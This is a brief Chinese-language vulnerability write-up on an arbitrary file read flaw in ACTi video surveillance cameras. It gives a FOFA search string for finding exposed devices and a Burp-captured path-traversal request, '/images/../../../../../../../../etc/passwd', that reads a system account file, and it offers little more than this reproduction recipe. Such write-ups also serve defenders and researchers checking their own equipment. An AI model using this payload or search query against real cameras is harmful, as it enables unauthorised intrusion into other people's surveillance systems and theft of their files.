# ACTI 视频监控 images 任意文件读取漏洞

## 漏洞描述

ACTI 视频监控 存在任意文件读取漏洞

## 漏洞影响

```
ACTI摄像头
```

## FOFA

```
app="ACTi-视频监控"
```

## 漏洞复现

登录页面如下

![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202140926386.png)

使用Burp抓包

```plain
/images/../../../../../../../../etc/passwd
```

![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202140926873.png)
